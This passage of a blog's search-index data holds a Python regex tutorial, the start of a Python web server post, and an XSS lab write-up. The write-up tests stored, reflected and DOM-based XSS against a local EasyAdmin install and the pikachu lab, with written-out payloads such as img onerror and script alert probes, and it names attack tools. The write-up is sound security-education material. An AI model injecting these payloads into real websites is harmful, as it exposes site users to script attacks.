小结参考：https://www.jianshu.com/p/5295c5988b7f","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Python基础","slug":"python/Python基础","permalink":"https://fishni.github.io/categories/python/Python%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://fishni.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"【python-正则】1.1Python正则表达式学习-1","slug":"1.1 Python正则表达式学习-1","date":"2020-04-12T16:00:00.000Z","updated":"2020-04-14T08:55:48.077Z","comments":true,"path":"2020/04/13/1.1 Python正则表达式学习-1/","link":"","permalink":"https://fishni.github.io/2020/04/13/1.1%20Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0-1/","excerpt":"本文主要内容：正则表达式概述、re模块操作、表示字符、原始字符串、表示数量、表示边界、 匹配分组、re模块的高级用法、贪婪和非贪婪、小练习","text":"本文主要内容：正则表达式概述、re模块操作、表示字符、原始字符串、表示数量、表示边界、 匹配分组、re模块的高级用法、贪婪和非贪婪、小练习 0x01 正则表达式概述正则表达式，又称正规表示式、正规表示法、正规表达式、 规则表达式、 常规表示法（英语：Regular Expression，在代码中常简写为regex、 regexp或RE），是计算机科学的一个概念。正则表达式使用单个字符串来描述、 匹配一系列匹配某个句法规则的字符串。 在很多⽂本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。 Regular Expression的“Regular”⼀般被译为“正则”、 “正规”、 “常规”。 此处的“Regular”即是“规则”、 “规律”的意思， Regular Expression即“描述某种规则的表达式”之意。 0x02 re模块操作 在Python中需要通过正则表达式对字符串进⾏匹配的时候，可以使⽤⼀个模块，名字为re 2.1 re模块的使用过程12345678# 导入re模块import re# 使用match方法进行匹配操作result = re.match(正则表达式，要匹配的字符串)# 如果上⼀步匹配到数据的话， 可以使⽤group⽅法来提取数据result.group() re.match是进行正则匹配检查的方法，若字符串匹配正则表达式，则match方法返回匹配对象（Match Object）,否则返回None（注意不是空字符串””） 匹配对象Match Object对象具有group方法，用来返回字符串的匹配部分 2.2 re模块示例12345#匹配hello开头的字符串import reresult = re.match(\"hello\",\"hello world\")# 查看Match object对象result Out:&lt;re.Match object; span=(0, 5), match=&apos;hello&apos;&gt;1result.group() Out:&apos;hello&apos;0x03 表示字符正则表达式单字符匹配常用的模式 字符 功能 . 匹配任意1个字符（除了\\n） [] 匹配[]中列举的字符 \\d 匹配数字，即0-9 \\D 匹配非数字，即不是数字 \\s 匹配空白，即空格、tab键 \\S 匹配非空白 \\w 匹配单词字符，即a-z、A-Z、0-9、_ \\W 匹配非单词字符 3.1 示例1：.1234import reret1 = re.match(\".\",\"a\")ret1.group() Out:&apos;a&apos;12ret2 = re.match(\".\",\"bca\")ret2.group() Out:&apos;b&apos;12ret3 = re.match(\".\",\"@18\")ret3.group() Out:&apos;@&apos;3.2 示例2：[]123# 如果hello的首字符⼩写， 那么正则表达式需要⼩写的hret1 = re.match(\"h\",\"hello Python\")ret1.group() Out:&apos;h&apos;123# 如果hello的首字符大写，则正则表达式则需要大写的Hret2 = re.match(\"H\",\"Hello Python\")ret2.group() Out:&apos;H&apos;123# 大小写都可以ret3 = re.match(\"[hH]\",\"hello Python\")ret3.group() Out:&apos;h&apos;12ret4 = re.match(\"[hH]\",\"Hello Python\")ret4.group() Out:&apos;H&apos;123# 匹配0-9第一种写法ret5 = re.match(\"[0123456789]\",\"7Hello\")ret5.group() Out:&apos;7&apos;123# 匹配0-9第二种写法ret6= re.match(\"[0-9]\",\"7Hello\")ret6.group() Out:&apos;7&apos;3.3 示例3：\\d123# 普通匹配ret1 = re.match(\"hello2\",\"hello2world\")ret1.group() Out:&apos;hello2&apos;123# 使用\\d匹配ret2 = re.match(\"hello\\d\",\"hello2world\")ret2.group() Out:&apos;hello2&apos;0x04 原始字符串4. 1 各种示例123# 比如：想打印出\\n,一个反斜杠时，当作换行符进行打印s= \"\\ndd\"print(s) 打印：dd12s= \"\\\\ndd\"print(s) 打印：\\ndd mm = “c:\\a\\b\\c” 12mm= \"c:\\\\a\\\\b\\\\c\"mm Out:&apos;c:\\\\a\\\\b\\\\c&apos;1print(mm) 打印：c:\\a\\b\\c12# 这里匹配需四个反斜杠，方能匹配字符串中两个反斜杠re.match(\"c:\\\\\\\\\",mm).group() Out:&apos;c:\\\\&apos;12ret = re.match(\"c:\\\\\\\\a\",mm).group()print(ret) 打印：c:\\a123# 使用rret =re.match(r\"c:\\\\a\",mm).group()print(ret) 打印：c:\\a12ret = re.match(r\"c:\\a\",mm).group()print(ret) 打印： --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-45-1a051863b698&gt; in &lt;module&gt; ----&gt; 1 ret = re.match(r&quot;c:\\a&quot;,mm).group() 2 print(ret) AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;4.2 示例说明Python字符串前面加上r 表示原生字符串 与大多数编程语言相同，正则表达式里使用”\\n”作为转义字符，这就可能造成反斜杠困扰。加入匹配文本中的字符串”\\“，那么使用编程语言表示的正则表达式里将需要4个反斜杠“\\\\”：前两个和后两个分别用于在编程语言里转义反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠 Python里的原生字符串很好的解决了这个问题，不再担心漏写反斜杠，写出的表达式更直观 123mm= \"c:\\\\a\\\\b\\\\c\"ret = re.match(r\"c:\\\\a\",mm).group()print(ret) 打印：c:\\a0x05 表示数量匹配多个字符的相关格式 字符 功能 * 匹配前一个字符出现0次或者无限次，即可有可无 + 匹配前一个字符出现1次或者无限次，即至少有1次 ? 匹配前一个字符出现1次或者0次, 即要么有1次，要么没有 {m} 匹配前一个字符出现m次 {m,} 匹配前一个字符至少出现m次 {m,n} 匹配前一个字符出现从m到n次 5.1 示例1：*需求：匹配出，一个字符串第一个字母为大写字符，后面都是小写字母并且这些小写字母可有可无 123import reret = re.match(\"[A-Z][a-z]*\",\"Mm\")ret.group() Out:&apos;Mm&apos;123# *前无匹配字符时是可以的ret = re.match(\"[A-Z][a-z]*\",\"M\")ret.group() Out:&apos;M&apos;123# *前字符的匹配有连续多个ret = re.match(\"[A-Z][a-z]*\",\"Mabcdef\")ret.group() Out:&apos;Mabcdef&apos;5.2 示例2：+需求：匹配出，变量名是否有效 123# [a-zA-Z]+表示与[a-zA-Z]至少匹配成功一个字母，[\\w]* 表示*前字符可有0个或多个ret = re.match(\"[a-zA-Z]+[\\w]*\",\"name1\")ret.group() Out:&apos;name1&apos;12ret = re.match(\"[a-zA-Z_]+[\\w]*\",\"_name\")ret.group() Out:&apos;_name&apos;12ret = re.match(\"[a-zA-Z_]+[\\w]*\",\"2_name\")ret.group() 打印: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-65-572ee7f143b4&gt; in &lt;module&gt; 1 ret = re.match(&quot;[a-zA-Z_]+[\\w]*&quot;,&quot;2_name&quot;) ----&gt; 2 ret.group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;5.3 示例3：？需求：匹配出，0-99之间的数字 12ret = re.match(\"[1-9]?[0-9]\",\"7\")ret.group() Out:&apos;7&apos;12ret = re.match(\"[1-9]?[0-9]\",\"33\")ret.group() Out:&apos;33&apos;123# 结果原因：第一个数字[1-9]未匹配到，？出现0次或1次；所以后一个[0-9]匹配了0ret =re.match(\"[1-9]?[0-9]\",\"09\")ret.group() Out:&apos;0&apos;5.4 示例4：{m}需求：匹配出，8-20位的密码，可以大小写英文字母、数字、下划线 1234import reret =re.match(\"[a-zA-Z0-9_]&#123;6&#125;\",\"12a3g45678\")ret.group() Out:&apos;12a3g4&apos;12ret = re.match(\"[a-zA-Z0-9_]&#123;8,20&#125;\",\"1ad12fffs39d739473920_d398sd\")ret.group() Out:&apos;1ad12fffs39d73947392&apos;123# [\\w]==[a-zA-Z0-9_]，当然其他也有各自的等价表示方法ret = re.match(\"[\\w]&#123;8,20&#125;\",\"1ad12fffs39d739473920_d398sd\")ret.group() Out:&apos;1ad12fffs39d73947392&apos; 简单练习，匹配出163的邮箱地址，且@符号之前有4-20位，例如hello@163.com 123# 简单练习，匹配163邮箱地址(不完善)ret =re.match(\"[\\w]&#123;4,20&#125;@163\\.com\",\"hell0@163.com\")ret.group() Out:&apos;hell0@163.com&apos;123# 思考如何匹配以。。。结尾ret = re.match(\"[\\w]&#123;4,20&#125;@163\\.com\",\"hello@163.comddddd\")ret.group() Out:&apos;hello@163.com&apos;0x06 表示边界 字符 功能 ^ 匹配字符串开头 $ 匹配字符串结尾 \\b 匹配一个单词的边界 \\B 匹配非单词边界 6.1 示例1：$需求：匹配163.com的邮箱地址 12345import re# 正确的地址ret = re.match(\"[\\w]&#123;4,20&#125;@163\\.com\",\"xiaoWang@163.com\")ret.group() Out:&apos;xiaoWang@163.com&apos;123# 不正确的地址ret = re.match(\"[\\w]&#123;4,20&#125;@163\\.com\",\"xiaoWang@163.comheihhh\")ret.group() Out:&apos;xiaowang@163.com&apos;123# 通过$来确定末尾,从而过滤不正确地址ret = re.match(\"[\\w]&#123;4,20&#125;@163\\.com$\",\"xiaoWang@163.comheihhh\")ret.group() 打印： --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-93-83efc35bff7d&gt; in &lt;module&gt; 1 # 通过$来确定末尾 2 ret = re.match(&quot;[\\w]{4,20}@163\\.com$&quot;,&quot;xiaoWang@163.comheihhh&quot;) ----&gt; 3 ret.group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;6.2 示例2：\\b1re.match(r\".*\\bver\\b\",\"ho ver abc\").group() Out:&apos;ho ver&apos;12# 当单词右边没有边界时，使用\\b出错re.match(r\".*\\bver\\b\",\"ho verabc\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-95-d65bbce81439&gt; in &lt;module&gt; ----&gt; 1 re.match(r&quot;.*\\bver\\b&quot;,&quot;ho verabc&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;12# 当指定单词左边无边界时，也出错re.match(r\".*\\bver\\b\",\"hover abc\").group() --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-96-53f69a15373e&gt; in &lt;module&gt; ----&gt; 1 re.match(r&quot;.*\\bver\\b&quot;,&quot;hover abc&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;6.3 示例3：\\B1re.match(r\".*\\Bver\\B\",\"hoverabc\").group() Out:&apos;hover&apos;12# 当指定词有左边界时，出错re.match(r\".*\\Bver\\B\",\"ho verabc\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-98-a9d342249fa1&gt; in &lt;module&gt; 1 # 当指定词有左边界时，出错 ----&gt; 2 re.match(r&quot;.*\\Bver\\B&quot;,&quot;ho verabc&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;12# 当指定的词，有右边界时，\\B出错re.match(r\".*\\Bver\\B\",\"hover abc\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-99-aae06b891466&gt; in &lt;module&gt; ----&gt; 1 re.match(r&quot;.*\\Bver\\B&quot;,&quot;hover abc&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;12# 当指定的词，左右都有边界时，\\B出错re.match(r\".*\\Bver\\B\",\"ho ver abc\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-101-9630adaf466f&gt; in &lt;module&gt; 1 # 当指定的词，左右都有边界时，\\B出错 ----&gt; 2 re.match(r&quot;.*\\Bver\\B&quot;,&quot;ho ver abc&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;0x07 匹配分组 字符 功能 (ab) 将括号中字符作为一个分组 \\num 引用分组num匹配到的字符串 (?P&lt;name&gt;) 分组起别名 (?P=name) 引用别名为name分组匹配到的字符串 7.1 示例1：|需求：匹配出0-100之间的数字 123import reret = re.match(\"[1-9]?\\d\",\"8\")ret.group() Out:&apos;8&apos;1re.match(\"[1-9]?\\d\",\"78\").group() Out:&apos;78&apos;12# 不确定的情况下re.match(\"[1-9]?\\d\",\"08\").group() Out:&apos;0&apos;12# 修正之后的re.match(\"[1-9]?\\d$\",\"08\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-106-70c347cddb39&gt; in &lt;module&gt; 1 # 修正之后的 ----&gt; 2 re.match(&quot;[1-9]?\\d$&quot;,&quot;08&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos; 添加 | 可匹配0到100（包括0和100） 12# 添加 |re.match(\"[1-9]?\\d$|100\",\"100\").group() Out:&apos;100&apos;1re.match(\"[1-9]?\\d$|100\",\"0\").group() Out:&apos;0&apos;7.2 示例2：()需求：匹配出163、126、qq邮箱直接的数字 1re.match(\"\\w&#123;4,20&#125;@163\\.com\",\"test@163.com\").group() Out:&apos;test@163.com&apos;12#使用 （）分组re.match(\"\\w&#123;4,20&#125;@(163|126|qq)\\.com\",\"test@126.com\").group() Out:&apos;test@126.com&apos;1re.match(\"\\w&#123;4,20&#125;@(163|126|qq)\\.com\",\"test@gmail.com\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-111-d286dbf8fcf2&gt; in &lt;module&gt; ----&gt; 1 re.match(&quot;\\w{4,20}@(163|126|qq)\\.com&quot;,&quot;test@gmail.com&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos; 练习： 12ret = re.match(\"([^-]*)-(\\d+)\",\"010-12345678\")ret.group() Out:&apos;010-12345678&apos;1ret.groups() Out:(&apos;010&apos;, &apos;12345678&apos;)12# ret.group()默认ret.group(0)ret.group(1) Out:&apos;010&apos;1ret.group(2) Out:&apos;12345678&apos;7.3 示例3：\\需求：匹配出&lt;html&gt;hh&lt;/html&gt; 12# 能够完成对正确的字符串的匹配re.match(\"&lt;[a-zA-Z]*&gt;\\w*&lt;/[a-zA-Z]*&gt;\",\"&lt;html&gt;hh&lt;/html&gt;\").group() Out:&apos;&lt;html&gt;hh&lt;/html&gt;&apos;12# 遇到非正常的html格式字符串，匹配出错re.match(\"&lt;[a-zA-Z]*&gt;\\w*&lt;/[a-zA-Z]*&gt;\", \"&lt;html&gt;hh&lt;/htmlbalabala&gt;\").group() Out:&apos;&lt;html&gt;hh&lt;/htmlbalabala&gt;&apos; 思路：如果在第一对&lt;&gt;中是什么，按理说后面的那对&lt;&gt;中就应该是什么 12# 通过引用分组中匹配到的数据即可,但是要注意是元字符串，即类似r\"\"这种格式re.match(r\"&lt;([a-zA-Z]*)&gt;\\w*&lt;/\\1&gt;\",\"&lt;html&gt;hh&lt;/html&gt;\").group() Out:&apos;&lt;html&gt;hh&lt;/html&gt;&apos;12# 因为2对&lt;&gt;中的数据不一致，所以没匹配出来re.match(r\"&lt;([a-zA-Z]*)&gt;\\w*&lt;/\\1&gt;\",\"&lt;html&gt;hh&lt;/htmlddd&gt;\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-126-f2f15b62f076&gt; in &lt;module&gt; 1 # 因为2对&lt;&gt;中的数据不一致，所以没匹配出来 ----&gt; 2 re.match(r&quot;&lt;([a-zA-Z]*)&gt;\\w*&lt;/\\1&gt;&quot;,&quot;&lt;html&gt;hh&lt;/htmlddd&gt;&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;7.4 \\number需求：匹配出&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h1&gt;&lt;/html&gt; 1re.match(r\"&lt;(\\w*&gt;)&lt;(\\w*)&gt;.*&lt;/\\2&gt;&lt;/\\1\",\"&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h1&gt;&lt;/html&gt;\").group() Out:&apos;&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h1&gt;&lt;/html&gt;&apos;1re.match(r\"&lt;(\\w*&gt;)&lt;(\\w*)&gt;.*&lt;/\\2&gt;&lt;/\\1\",\"&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h2&gt;&lt;/html&gt;\").group() Out: --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-128-1cf071943a2d&gt; in &lt;module&gt; ----&gt; 1 re.match(r&quot;&lt;(\\w*&gt;)&lt;(\\w*)&gt;.*&lt;/\\2&gt;&lt;/\\1&quot;,&quot;&lt;html&gt;&lt;h1&gt;www.baidu.com&lt;/h2&gt;&lt;/html&gt;&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;7.5 示例5:（?P&lt;name&gt;）(?P=name)12ret = re.match(r\"&lt;(?P&lt;name1&gt;\\w*)&gt;&lt;(?P&lt;name2&gt;\\w*)&gt;.*&lt;/(?P=name2)&gt;&lt;/(?P=name1)&gt;\", \"&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;\")ret.group() Out:&apos;&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;&apos; 注意：(?P&lt;name&gt;)和(?P=name)中的字母p大写 0x08 re模块的高级用法search需求：匹配出文章的阅读次数 12ret =re.search(r\"\\d+\",\"阅读次数为9999\")ret.group() Out:&apos;9999&apos;findall需求：统计出python、c、c++相应文章阅读的次数 12ret = re.findall(r\"\\d+\",\"python=9999,c=7890,c++=1234\")ret Out:[&apos;9999&apos;, &apos;7890&apos;, &apos;1234&apos;]sub 将匹配到的数据进行替换 需求：将匹配到的阅读次数加1 方法1 123# sub（要匹配的模式，要替换的内容，被替换的内容）ret =re.sub(r\"\\d+\",\"998\",\"python=997\")ret OUt:&apos;python=998&apos; 方法2 12345678910# sub可传递函数，将匹配到的内容再以参数形式传给定义的函数import redef add(temp): print(temp) strNum = temp.group() num =int(strNum) +1 return str(num)ret =re.sub(r\"\\d+\",add,\"python=997\")ret Out:&lt;re.Match object; span=(7, 10), match=&apos;997&apos;&gt; Out:&apos;python=998&apos; 练习:从下面的字符串中取出文本 1234567891011121314&lt;div&gt;&lt;p&gt;岗位职责： &lt;&#x2F;p&gt;&lt;p&gt;完成推荐算法、 数据统计、 接⼝、 后台等服务器端相关⼯作&lt;&#x2F;p&gt;&lt;p&gt;&lt;br&gt;&lt;&#x2F;p&gt;&lt;p&gt;必备要求： &lt;&#x2F;p&gt;&lt;p&gt;良好的⾃我驱动⼒和职业素养， ⼯作积极主动、 结果导向&lt;&#x2F;p&gt;&lt;p&gt;&amp;nbsp;&lt;br&gt;&lt;&#x2F;p&gt;&lt;p&gt;技术要求： &lt;&#x2F;p&gt;&lt;p&gt;1、 ⼀年以上 Python 开发经验， 掌握⾯向对象分析和设计， 了解设计模式&lt;&#x2F;p&gt; &lt;p&gt;2、 掌握HTTP协议， 熟悉MVC、 MVVM等概念以及相关WEB开发框架&lt;&#x2F;p&gt;&lt;p&gt;3、 掌握关系数据库开发设计， 掌握 SQL， 熟练使⽤ MySQL&#x2F;PostgreSQL 中的⼀种&lt;br&gt;&lt;&#x2F;p&gt;&lt;p&gt;4、 掌握NoSQL、 MQ， 熟练使⽤对应技术解决⽅案&lt;&#x2F;p&gt; 123456789101112s=\"\"\"&lt;div&gt;&lt;p&gt;岗位职责：&lt;/p&gt;&lt;p&gt;完成推荐算法、 数据统计、 接口、 后台等服务器端相关工作&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;必备要求： &lt;/p&gt;&lt;p&gt;良好的自我驱动力和职业素养， 工作积极主动、 结果导向&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;br&gt;&lt;/p&gt;&lt;p&gt;技术要求： &lt;/p&gt;&lt;p&gt;1、 一年以上 Python 开发经验， 掌握面向对象分析和设计， 了解设计模式&lt;/p&gt; \"\"\"ret =re.sub(r\"&lt;/?\\w*&gt;\",\"\",s)ret Out: &apos;\\n岗位职责：\\n完成推荐算法、 数据统计、 接口、 后台等服务器端相关工作\\n\\n必备要求： \\n良好的自我驱动力和职业素养， 工作积极主动、 结果导向\\n&amp;nbsp;\\n技术要求： \\n1、 一年以上 Python 开发经验， 掌握面向对象分析和设计， 了解设计模式 \\n&apos;split 根据匹配进行切割字符串，并返回一个列表 需求：切割字符串“info:dddd 33 shandong” 12ret =re.split(r\":| \",\"info:dddd 33 shandong\")ret Out:[&apos;info&apos;, &apos;dddd&apos;, &apos;33&apos;, &apos;shandong&apos;]0x09 Python贪婪和非贪婪Python里数量词默认是贪婪的（在少数语言里也可能是默认非贪婪），总是尝试匹配尽可能多的字符； 非贪婪相反，总是尝试匹配尽可能少的字符。 在*、?、+、{m,n}后面加上？，使贪婪变成非贪婪 123s = \"this is a number 234-235-22-423\"r = re.match(\".+(\\d+-\\d+-\\d+-\\d+)\",s)r.group(1) Out:&apos;4-235-22-423&apos;123# 变为非贪婪r = re.match(\".+?(\\d+-\\d+-\\d+-\\d+)\",s)r.group(1) Out:&apos;234-235-22-423&apos; 说明：正则表达式模式中使用到通配字， 那它在从左到右的顺序求值时， 会尽量“抓取”满足匹配最长字符串， 在我们上面的例子里面， “.+”会从字符串的起始处抓取满足模式的最长字符， 其中包括我们想得到的第一个整型字段的中的大部分，“\\d+”只需一位字符就可以匹配， 所以它匹配了数字“4”， 而“.+”则匹配了从字符串起始到这个第一位数字4之前的所有字符。 解决方式：非贪婪操作符“？”,这个操作符可以用在*、?、+、{m,n}后面，要求正则匹配的越少越好。 1re.match(r\"aa(\\d+)\",\"aa2343ddd\").group(1) Out:&apos;2343&apos;1re.match(r\"aa(\\d+?)\",\"aa2343ddd\").group(1) Out:&apos;2&apos;练习1提取下面文本中图片链接 1&lt;link rel&#x3D;&quot;apple-touch-icon-precomposed&quot; href&#x3D;&quot;https:&#x2F;&#x2F;s.mozhe.cn&#x2F;static&#x2F;ico&#x2F;apple-touch-icon.png&quot;&gt; 123s= \"\"\"&lt;link rel=\"apple-touch-icon-precomposed\" href=\"https://s.mozhe.cn/static/ico/apple-touch-icon.png\"&gt; &lt;link rel=\"apple-touch-icon-precomposed\" href=\"https://s.mozhe.cn/static/ico/apple-touch-icon.png\"&gt;\"\"\"ret =re.search(r\"https:.+?\\.png\",s)ret.group() Out:&apos;https://s.mozhe.cn/static/ico/apple-touch-icon.png&apos;练习2123https:&#x2F;&#x2F;www.baidu.com&#x2F;s?wd&#x3D;dd&amp;rsv_spt&#x3D;1正则后变为：https:&#x2F;&#x2F;www.baidu.com&#x2F; 12s= \"\"\"https://www.baidu.com/s?wd=dd&amp;rsv_spt=1\"\"\"re.sub(r\"https://.+?/\", \"\", s) Out:&apos;s?wd=dd&amp;rsv_spt=1&apos;12# 使用匿名函数lambda作为处理函数re.sub(r\"(https://.+?/).*\",lambda x: x.group(1),s) Out:&apos;https://www.baidu.com/&apos;","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Python基础","slug":"python/Python基础","permalink":"https://fishni.github.io/categories/python/Python%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://fishni.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"【XSS（一）】1.2 XSS（存储型-反射型-DOM型）实战","slug":"1.2 XSS（存储型-反射型-DOM型）实战","date":"2020-04-10T16:00:00.000Z","updated":"2020-04-14T08:52:50.431Z","comments":true,"path":"2020/04/11/1.2 XSS（存储型-反射型-DOM型）实战/","link":"","permalink":"https://fishni.github.io/2020/04/11/1.2%20XSS%EF%BC%88%E5%AD%98%E5%82%A8%E5%9E%8B-%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM%E5%9E%8B%EF%BC%89%E5%AE%9E%E6%88%98/","excerpt":"本文主要内容 存储型、反射型、DOM型造成XSS漏洞的简单原理、危害、攻击流程 利用EasyAdmin极简版的实战测试案例 几种XSS辅助测试工具","text":"本文主要内容 存储型、反射型、DOM型造成XSS漏洞的简单原理、危害、攻击流程 利用EasyAdmin极简版的实战测试案例 几种XSS辅助测试工具 认识危害 0x01 发现XSS1.1 XSS位置 直接插入到SCRIPT标签里 插入到HTML注释里 插入到HTML标签的属性里 插入到HTML标签的名字 作为HTML标签的名字 直接插入到CSS里 …… 1.2 手工发现 参数中提交XSS payload代码 在所有可以提交参数并能在页面返回的位置上 URL的每一个参数 URL本身 表单 搜索框 …… 1.3 常见业务场景 重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈等 存在风险：搜索框、当前目录、图片属性等 实战环境配置 EasyAdmin极简版安装：[下载链接](链接：https://pan.baidu.com/s/1mEIcBSoFBBjN9DgIDzyxcg提取码：qpzn) 下载后，本地windows+phpstudy，放置在WWW目录下 访问，之后创建数据库，即可完成配置 0x01 存储型XSS实战1.1 存储型XSS攻击流程 1.2 利用easyadmin进行测试 利用img标签，&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;进行测试存在漏洞的地方 经测试，发现在添加标签时，出现弹窗 发布后，当点击该帖子，即可弹窗 点击开发者工具，可发现对添加的图片标签进行解析了，但并未解析出来，故执行了onerror事件，弹窗 0x02 反射型XSS实战2.1 反射型XSS攻击流程 2.2 利用easyadmin测试 攻击者在URL中插入XSS代码，服务端将URL中的XSS代码输出到页面上，攻击者将带有XSS代码的URL发送给用户，用户打开后受到XSS攻击 寻址存在URL的输入点，测试搜索栏 闭合title，并测试弹窗 寻找其他输入点 尖括号闭合，测试&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 0x03DOM型XSS实战3.1 测试环境 ubuntu+docker+pikachu之xss平台 3.2 DOM型xss测试 DOM型xss-x初始化界面： 步骤一：输入111，URL发生变化 再点击新出现的，URL又发生变化 步骤二：F12审查源码 步骤三：审查domxss()函数 分析：JS代码，定义了一个domxss函数，利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str，然后经过URL解码和字符串分隔，取出URL中的参数内容，再把 “+” 替换为 “ ”（空格），赋值给 xss最后把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中；跟前面的DOM型xss不同的是，它的输入是从浏览器的URL中获取的，很像反射型XSS(get) 步骤四：构造payload：#&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt; 尝试payload：#&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt; 0x04 XSS辅助测试工具4.1 BeEFhttp://beefproject.com 4.2 XSS’ORhttp://xssor.io 4.3 IE Testerhttps://www.my-debugbar.com/wiki/IETester/HomePage 等等……..参考链接 http://blog.nsfocus.net/xss-start-finish/#34","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"},{"name":"XSS","slug":"XSS","permalink":"https://fishni.github.io/tags/XSS/"}]},{"title":"【python-Web服务器】1.6 python-Web服务器框架-实现","slug":"1.6 python-Web服务器框架-实现","date":"2020-04-09T16:00:00.000Z","updated":"2020-04-10T01:54:29.234Z","comments":true,"path":"2020/04/10/1.6 python-Web服务器框架-实现/","link":"","permalink":"https://fishni.github.io/2020/04/10/1.6%20python-Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A1%86%E6%9E%B6-%E5%AE%9E%E7%8E%B0/","excerpt":"本文主要内容：将Web框架和Web服务器结合实现简单的服务器，及相关python知识的了解","text":"本文主要内容：将Web框架和Web服务器结合实现简单的服务器，及相关python知识的了解 0x01 服务器代码（MyWebServer.py）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101# coding:utf-8import socketimport reimport sysfrom multiprocessing import Processfrom MyWebFramework import Application# 设置静态文件根目录HTML_ROOT_DIR = \"./html\"WSGI_PYTHON_DIR = \"./wsgipython\"class HTTPServer(object): \"\"\"\"\"\" def __init__(self, application): \"\"\"构造函数， application指的是框架的app\"\"\" self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.app = application def start(self): self.server_socket.listen(128) while True: client_socket, client_address = self.server_socket.accept() # print(\"[%s, %s]用户连接上了\" % (client_address[0],client_address[1])) print(\"[%s, %s]用户连接上了\" % client_address) handle_client_process = Process(target=self.handle_client, args=(client_socket,)) handle_client_process.start() client_socket.close() def start_response(self, status, headers): \"\"\" status = \"200 OK\" headers = [ (\"Content-Type\", \"text/plain\") ] star \"\"\" response_headers = \"HTTP/1.1 \" + status + \"\\r\\n\" for header in headers: response_headers += \"%s: %s\\r\\n\" % header self.response_headers = response_headers def handle_client(self, client_socket): \"\"\"处理客户端请求\"\"\" # 获取客户端请求数据 request_data = client_socket.recv(1024) print(\"request data:\", request_data) request_lines = request_data.splitlines() for line in request_lines: print(line) # 解析请求报文 # 'GET / HTTP/1.1' request_start_line = request_lines[0] # 提取用户请求的文件名 print(\"*\" * 10) print(request_start_line.decode(\"utf-8\")) file_name = re.match(r\"\\w+ +(/[^ ]*) \", request_start_line.decode(\"utf-8\")).group(1) method = 